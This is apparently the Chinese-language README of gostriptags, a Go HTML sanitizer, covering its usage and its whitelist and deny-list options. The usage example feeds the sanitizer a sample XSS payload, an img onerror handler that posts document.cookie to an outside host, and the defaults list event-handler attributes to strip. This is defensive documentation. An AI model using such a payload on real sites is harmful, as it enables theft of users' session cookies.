gostriptags 可以用来移除白名单以外的 HTML 元素和属性。

##用法
```go
package main

import (
	"striptags"
)

func main() {
	html_str = `
	<p> hello world </p>
	<a title="google" href="http://www.google.com" onclick="send(this);">google search</a>
	<ul source="mobile">
		<li>apple</li>
		<li active="active">htc</li>
		<li>meizu</li>
		<li>sony</li>
	</ul>
	<img src="http://logo.com" onerror="$.post('demo.com/cookie',{'cookie':document.cookie})" />
	`
	strip_tags := NewStripTags()
	html_clean, err := strip_tags.Fetch(html_str) // 返回过滤后的 HTML 字符串和错误信息
	fmt.Println(html_clean)
}
```

## 可选项

##是否转义非法的标签，默认：`false`
```go
strip_tags.EscapeInValid = true
```
----------------------------------------
##是否清除文本数据的空格和换行符，默认：`false`
```go
strip_tags.TrimSpace = true
```
----------------------------------------
##设置可允许的标签或标签对应的属性
```go
strip_tags.ValidTags = map[string]interface{}{
	"p":  true,
	"li": false, // 删除 li 元素的所有属性(除了全局允许的属性)
	"ul": true,  // 允许 ul 元素的所有属性(除了全局禁止的属性)
	"a":  map[string]interface{}{"href": true},
}
```
**默认允许的标签和属性**
```go
this.ValidTags = map[string]interface{}{
			"a": map[string]interface{}{
			    // 标签的属性配置可以是 bool 或者 func
				"href": func(v string) bool {
					// 如果函数返回 true，该属性会被删除。否则会被保留
					return strings.HasPrefix(v, "javascript:")
				},
			},
			"abbr":    true,
			"address": true,
			"article": true,

			"audio":      true,
			"b":          true,
			"blockquote": true,
			"br":         true,
			"button":     true,
			"caption":    true,
			"code":       true,
			"cite":       true,
			"div":        true,
			"dl":         true,
			"dt":         true,
			"dd":         true,
			"del":        true,
			"em":         true,

			"h1": true,
			"h2": true,
			"h3": true,
			"h4": true,
			"h5": true,
			"h6": true,

			"hr":     true,
			"i":      true,
			"kbd":    true,
			"li":     true,
			"ol":     true,
			"p":      true,
			"pre":    true,
			"small":  true,
			"span":   true,
			"strong": true,
			"sub":    true,

			"table": true,
			"thead": true,
			"tbody": true,
			"tfoot": true,
			"tr":    true,
			"th":    true,
			"td":    true,

			"time":  true,
			"u":     true,
			"ul":    true,
			"video": true,
			"img":   true,
		}
	}
```

----------------------------------------
##设置默认允许的属性
```go
strip_tags.ValidAttrs = map[string]bool{
	"title": true, "id": true,
	"class": true, "alt": true,
	"rel": true,
}
```
**默认允许的属性**
```go
this.ValidAttrs = map[string]bool{
	"title": true, "id": true,
	"class": true, "alt": true,
	"rel": true, "valign": true,
	"align": true, "rowspan": true,
	"colspan": true,
}
```
----------------------------------------
##设置默认清除的属性
```go
strip_tags.DisableAttrs = map[string]bool{
	"onclick": true, "onerror": true,
}
```
**默认清除的属性**
```go
this.DisableAttrs = map[string]bool{
	"onclick": true, "onerror": true,
}
```